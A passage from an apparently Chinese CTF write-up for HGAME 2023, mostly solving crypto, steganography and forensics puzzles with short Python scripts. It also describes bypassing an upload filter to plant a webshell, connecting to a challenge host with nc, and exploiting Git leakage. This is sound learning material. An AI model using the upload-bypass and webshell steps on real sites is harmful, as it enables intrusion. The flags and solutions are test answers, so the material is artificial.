<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;00&#x27;</span> <span class="hljs-keyword">in</span> text1:<br>        text1=text1[text1.index(<span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">5</span>:] <span class="hljs-comment">#爬下来特殊字符都是unicode编码，去掉这些编码符，后面匹配就行</span><br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(text1)</span><br>    <span class="hljs-comment"># print(text2)</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.js&#x27;</span>, mode=<span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        line0 = f.readline()<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            line1 = f.readline()<br>            <span class="hljs-keyword">if</span> line1:<br>                <span class="hljs-keyword">if</span> text1 <span class="hljs-keyword">in</span> line1:<br>                    answer = line0[line0.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">3</span>:-<span class="hljs-number">3</span>]<br>                    <span class="hljs-comment"># print(answer)</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    line0 = line1<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br>    data=&#123;<br>        <span class="hljs-string">&quot;id&quot;</span>:answer<br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    r = requests.post(url=url+<span class="hljs-string">&#x27;/api/verifyAnswer&#x27;</span>,data=data,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    <span class="hljs-keyword">try</span>:<br>        Cookie=r.headers[<span class="hljs-string">&#x27;set-cookie&#x27;</span>]  <span class="hljs-comment">#有时访问后没有返回cookie会报错</span><br>    <span class="hljs-keyword">except</span> KeyError:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-comment"># print(Cookie)</span><br>    <span class="hljs-built_in">print</span>(r.text)<br>    resp2 = requests.get(url2, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(text2)<br></code></pre></td></tr></table></figure><p>回答100次后得到flag:<code>hgame&#123;Guess_who_i_am^Happy_Crawler&#125;</code></p><h3 id="show-me-your-beauty"><a class="markdownIt-Anchor" href="#show-me-your-beauty"></a> Show Me Your Beauty</h3><p>这是一道文件上传</p><p>查看页面源码，发现做了前端过滤，不过前端过滤相当于没有过滤</p><p>传个码上去，先用后缀.jpg，再抓包改，发现后端也过滤了，这里可以大写绕过</p><img src="/2023/01/05/HGAME/4.png" class=""><p>蚁剑连接拿flag</p><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>拿到附件，源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n=p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br><span class="hljs-string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>常规RSA题</p><p><a href="http://www.factordb.com/">在线网站</a>大整数分解n得到p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br>n=<span class="hljs-number">135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br>p=<span class="hljs-number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span><br>q=<span class="hljs-number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h3 id="be-stream"><a class="markdownIt-Anchor" href="#be-stream"></a> Be Stream</h3><p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(flag) == <span class="hljs-built_in">bytes</span><br><br>key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">elif</span> i==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (stream(i-<span class="hljs-number">2</span>)*<span class="hljs-number">7</span> + stream(i-<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>)<br><br>enc = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    water = stream((i//<span class="hljs-number">2</span>)**<span class="hljs-number">6</span>) % <span class="hljs-number">256</span><br>    enc += <span class="hljs-built_in">bytes</span>([water ^ flag[i]])<br><br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment"># b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br></code></pre></td></tr></table></figure><p>循环加递归，重复太多，直接按这种写法是跑步出来的</p><p>修改成迭代，每次先mod256</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>():<br>    stream = [<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">48</span> // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>)]<br>    stream[<span class="hljs-number">0</span>] = key[<span class="hljs-number">0</span>]<br>    stream[<span class="hljs-number">1</span>] = key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">24</span> ** <span class="hljs-number">6</span>):<br>        stream[i] = (stream[i - <span class="hljs-number">2</span>] * <span class="hljs-number">7</span> + stream[i - <span class="hljs-number">1</span>] * <span class="hljs-number">4</span>) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> stream<br><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>enc = <span class="hljs-string">b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br>s = stream()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>    water = s[(i // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>] % <span class="hljs-number">256</span><br>    <span class="hljs-comment">#print(water)</span><br>    flag += <span class="hljs-built_in">chr</span>(water ^ enc[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="神秘的电话"><a class="markdownIt-Anchor" href="#神秘的电话"></a> 神秘的电话</h3><p>附件是一个morse音频和一个加密密文</p><p>加密密文为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">5</span>Ye<span class="hljs-name">g5</span>Liq<span class="hljs-number">5</span>pif<span class="hljs-number">5</span>pyf<span class="hljs-number">5</span>Ym<span class="hljs-symbol">N77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>pS<span class="hljs-number">25</span>Yiw<span class="hljs-number">5</span>LiA<span class="hljs-number">5</span>Liq<span class="hljs-number">56</span>We<span class="hljs-number">56</span>eY<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>L<span class="hljs-number">2</span><span class="hljs-name">G5</span>piv<span class="hljs-number">6</span>L+Z<span class="hljs-number">5</span>Liq<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">6</span>KKr<span class="hljs-number">6</span>Ye<span class="hljs-symbol">N6</span>Ye<span class="hljs-symbol">N5</span>Yq<span class="hljs-name">g5</span>a+<span class="hljs-name">G77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>Li<span class="hljs-symbol">N55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">5</span>a<span class="hljs-number">6</span>D<span class="hljs-number">55</span>qE<span class="hljs-number">55</span>yf<span class="hljs-number">5</span>q<span class="hljs-number">2</span>j<span class="hljs-number">5</span>ZCr<span class="hljs-number">5</span>LmJ<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>LuA<span class="hljs-number">5</span>LmI<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>ZSv<span class="hljs-number">5</span>LiA<span class="hljs-number">55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>L+h<span class="hljs-number">5</span>oGv<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>YWz<span class="hljs-number">5</span>Lq<span class="hljs-meta">O5</span>a+<span class="hljs-name">G6</span>ZKl<span class="hljs-number">55</span>qE<span class="hljs-number">77</span>ya<span class="hljs-number">4</span>oCc<span class="hljs-number">5</span>Y+q<span class="hljs-number">5</span>pyJ<span class="hljs-number">5</span>YCS<span class="hljs-number">552</span>A<span class="hljs-number">57</span><span class="hljs-number">+76</span>L+H<span class="hljs-number">5</span>Y<span class="hljs-number">2</span>B<span class="hljs-number">5</span>YWr<span class="hljs-number">5</span>bGC<span class="hljs-number">55</span>qE<span class="hljs-number">56</span>+x<span class="hljs-number">56</span>y<span class="hljs-name">G5</span>om<span class="hljs-symbol">N6</span>I<span class="hljs-meta">O95</span>oq<span class="hljs-number">16</span>L<span class="hljs-number">6</span><span class="hljs-number">+5</span>YyX<span class="hljs-number">5</span>qy<span class="hljs-symbol">n56</span>We<span class="hljs-number">6</span>K+d<span class="hljs-number">55</span>qE<span class="hljs-number">57</span>uI<span class="hljs-number">54</span>K<span class="hljs-number">54</span>oCd<span class="hljs-number">44</span>CC<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=<span class="hljs-string">&quot;5Yeg5Liq5pif5pyf5YmN77yM5oiR5Lus5pS25Yiw5LiA5Liq56We56eY55qE5raI5oGv44CC5L2G5piv6L+Z5Liq5raI5oGv6KKr6YeN6YeN5Yqg5a+G77yM5oiR5Lus5LiN55+l6YGT5a6D55qE55yf5q2j5ZCr5LmJ5piv5LuA5LmI44CC5ZSv5LiA55+l6YGT55qE5L+h5oGv5piv5YWz5LqO5a+G6ZKl55qE77ya4oCc5Y+q5pyJ5YCS552A57+76L+H5Y2B5YWr5bGC55qE56+x56yG5omN6IO95oq16L6+5YyX5qyn56We6K+d55qE57uI54K54oCd44CC&quot;</span><br>a=base64.b64decode(a)<br><span class="hljs-built_in">print</span>(a.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-comment">#几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。</span><br></code></pre></td></tr></table></figure><p>音频用Au打开，手动翻译morse密文</p><p><code>-----/..---/..---/...--/./..--.-/.--./.-./../../-.../.-../-.--/..--.-/..--.-/..../---/-./.--/.-/..--.-/.---/--/--./..../..--.-/..-./--./-.-/-.-./--.-/.-/---/--.-/-/--/..-./.-.</code></p><p><a href="https://mosimima.hwcha.com/">在线解码</a> 并转小写<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>“倒着翻过十八层篱笆”应该是栅栏加密，但是搞不出来😭~~~</p><p>wp出来啦，继续补充一下</p><p>没想到“北欧神话”对应维吉尼亚密码…</p><p>“逆序”-&gt;“18层栅栏解密”-&gt;“密钥为vidar的维吉尼亚解密”</p><p><code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><h3 id="兔兔的车票"><a class="markdownIt-Anchor" href="#兔兔的车票"></a> 兔兔的车票</h3><p>由于没有看到题目的注解<code>注：flag.png已经提前保存在source文件夹下，并且命名为picture&#123;x&#125;.png</code></p><p>导致没有思路，官方wp已经出了还是记录一下加深理解</p><p>题⽬的流程是先随机⽣成3张噪声图⽚作为nonce，然后把flag.png和picture{xx}.png打乱再与nonce</p><p>进⾏XOR。因为只有三张nonce，⽽picture有15张，所以⼤概率有picture跟flag.png重⽤了同⼀张</p><p>nonce。就可以⽤这两张加密图⽚进⾏XOR，得到</p><p><em>flag</em>.<em>png</em> ⊕ <em>picturex</em>.<em>png</em></p><img src="/2023/01/05/HGAME/15.png" class=""><p>原题代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle, randint, getrandbits<br><br>flagImg = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>width = flagImg.width  <span class="hljs-comment">#379</span><br>height = flagImg.height <span class="hljs-comment">#234</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    colors = long_to_bytes(getrandbits(width * height * <span class="hljs-number">24</span>))[::-<span class="hljs-number">1</span>]<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (colors[x], colors[x + <span class="hljs-number">1</span>], colors[x + <span class="hljs-number">2</span>]))<br>            x += <span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><br>n1 = makeSourceImg()<br>n2 = makeSourceImg()<br>n3 = makeSourceImg()<br>nonce = [n1, n2, n3]<br><br>index = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))<br>shuffle(index)<br>e=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> index:<br>    im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    key = nonce[randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)]<br>    encImg = xorImg(key, im)<br>    encImg.save(<span class="hljs-string">f&#x27;pics/enc<span class="hljs-subst">&#123;e&#125;</span>.png&#x27;</span>)<br>    e+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>只有16张图片，直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>width=<span class="hljs-number">379</span>   <span class="hljs-comment">#宽度和高度查看图片属性可知</span><br>height=<span class="hljs-number">234</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xorImg</span>(<span class="hljs-params">keyImg, sourceImg</span>):<br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))<br>            img.putpixel((j, i), <span class="hljs-built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br>    <span class="hljs-keyword">return</span> img<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    key = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;j&#125;</span>.png&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        encimg=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;pics/enc<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br><br>        im=xorImg(key,encimg)<br>        im.save(<span class="hljs-string">f&quot;source/picture<span class="hljs-subst">&#123;j&#125;</span>.<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/16.png" class=""><h3 id="test-your-ida"><a class="markdownIt-Anchor" href="#test-your-ida"></a> test your IDA</h3><p>查一下64位，IDA打开看到flag</p><img src="/2023/01/05/HGAME/5.png" class=""><h3 id="e99p1ant_want_girlfriend"><a class="markdownIt-Anchor" href="#e99p1ant_want_girlfriend"></a> e99p1ant_want_girlfriend</h3><p>拿到一张图片，看起来那个人下面好像少了一点，直接修改长度</p><img src="/2023/01/05/HGAME/1.png" class=""><img src="/2023/01/05/HGAME/2.png" class=""><h3 id="神秘的海报"><a class="markdownIt-Anchor" href="#神秘的海报"></a> 神秘的海报</h3><p>附件是一张HGAME比赛的海报</p><img src="/2023/01/05/HGAME/7.png" class=""><p>用Stegsolve打开,尝试LSB隐写</p><img src="/2023/01/05/HGAME/8.png" class=""><p>整段话提取出来是</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Sure enough, you still remember  what we  talked a bout at  that <span class="hljs-type">time</span>! This  <span class="hljs-keyword">is</span> part  <span class="hljs-keyword">of</span> the secret: ` hgame&#123;U_ Kn0w_LSB&amp;W`.I put the rest <span class="hljs-keyword">of</span> th e content here,  https://drive.google.com/file/d/<span class="hljs-number">13</span>kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/<span class="hljs-keyword">view</span>?usp=sharing, <span class="hljs-keyword">if</span> you directly <span class="hljs-keyword">access</span> the g oogle drive cloud disk download  <span class="hljs-keyword">in</span> China, it will be very slow,  you can try <span class="hljs-keyword">to</span> u se Scientific Internet <span class="hljs-keyword">access</span> solves the problem <span class="hljs-keyword">of</span> slow <span class="hljs-keyword">or</span> inaccessible <span class="hljs-keyword">access</span>  <span class="hljs-keyword">to</span> <span class="hljs-keyword">external</span> network resources. This <span class="hljs-keyword">is</span> my favorite music, there  <span class="hljs-keyword">is</span> another part  <span class="hljs-keyword">of</span> the secret <span class="hljs-keyword">in</span>  the music, I use Steghide <span class="hljs-keyword">to</span> encrypt, the <span class="hljs-keyword">password</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> the  <span class="hljs-number">6</span>-digit <span class="hljs-keyword">password</span>  we agreed at the <span class="hljs-type">time</span>, even <span class="hljs-keyword">if</span>  someone <span class="hljs-keyword">else</span> finds <span class="hljs-keyword">out</span> here, it  should <span class="hljs-keyword">not</span> be so  easy <span class="hljs-keyword">to</span><br></code></pre></td></tr></table></figure><p>这里给了一半的flag，另一半要访问网站<a href="https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing">https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing</a> ，下载音频（要有梯子，不然下不来）</p><p>里面说了用Steghide加密的，直接上网搜一下Steghide的用法<a href="https://www.jianshu.com/p/c3679f805a0c">https://www.jianshu.com/p/c3679f805a0c</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>steghide   <span class="hljs-comment">#安装</span><br>steghide info <span class="hljs-keyword">Bossanova.wav </span>  <span class="hljs-comment">#查看隐藏的文件</span><br>steghide <span class="hljs-keyword">extract </span>-sf <span class="hljs-keyword">Bossanova.wav </span> <span class="hljs-comment">#提取隐藏的文件</span><br></code></pre></td></tr></table></figure><p>得到flag2.txt <code>恭喜你解到这里，剩下的Flag是 av^Mp3_Stego&#125;，我们Week2见！</code></p><p><code>hgame&#123;U_ Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><h3 id="where-am-i"><a class="markdownIt-Anchor" href="#where-am-i"></a> Where am I</h3><p>给了一个流量包</p><p>因为图片是上传到网盘，所以导出HTTP对象,得到两个文件,一个里面只写了<code>upload successful</code></p><p>另一个则有含有压缩包，<code>binwalk -e file </code>分离，用winhex打开，把头尾多余的文字删除</p><img src="/2023/01/05/HGAME/11.jpg" class=""><img src="/2023/01/05/HGAME/12.png" class=""><p>打开发现文件头错误，应该是伪加密</p><p>将24修改为20</p><img src="/2023/01/05/HGAME/13.png" class=""><p>解压得到图片，linux下用exfitool查看信息</p><img src="/2023/01/05/HGAME/14.png" class=""><p><code>hgame&#123;116_24_1488E_39_54_5418N&#125;</code></p><h3 id="test_nc"><a class="markdownIt-Anchor" href="#test_nc"></a> test_nc</h3><p>直接nc <a href="http://week-1.hgame.lwsec.cn">week-1.hgame.lwsec.cn</a> 31750</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br><span class="hljs-comment">#bin</span><br><span class="hljs-comment">#dev</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#lib</span><br><span class="hljs-comment">#lib32</span><br><span class="hljs-comment">#lib64</span><br><span class="hljs-comment">#vuln</span><br><span class="hljs-built_in">cat</span> flag<br><span class="hljs-comment">#hgame&#123;1b32ad7a265058ea9f2ccc866b97085bb10c4f14&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week-2"><a class="markdownIt-Anchor" href="#week-2"></a> Week 2</h2><h3 id="git-leakage"><a class="markdownIt-Anchor" href="#git-leakage"></a> Git Leakage</h3><p>题目直接说了是Git 泄露</p><p>那就直接<code>python3 Githack.py 